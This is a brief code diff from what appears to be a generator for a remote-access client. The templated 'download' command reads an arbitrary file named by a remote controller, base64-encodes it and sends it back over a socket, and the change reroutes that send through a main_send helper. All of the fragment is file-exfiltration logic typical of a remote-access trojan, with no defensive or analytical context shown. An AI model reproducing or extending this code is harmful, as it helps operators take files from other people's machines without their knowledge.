@@ -15,7 +15,7 @@ def download(data):
     filepath = data.split(' ',1)[1]
     with open(filepath,'rb') as f:
         file_data = f.read()
-    s.sendall((filepath + ' ' + b64encode(file_data).decode()).encode())''')
+    main_send(filepath + ' ' + b64encode(file_data).decode(), s)''')
         config.logics.append('''
             elif command == "download":
                 download(data)''')
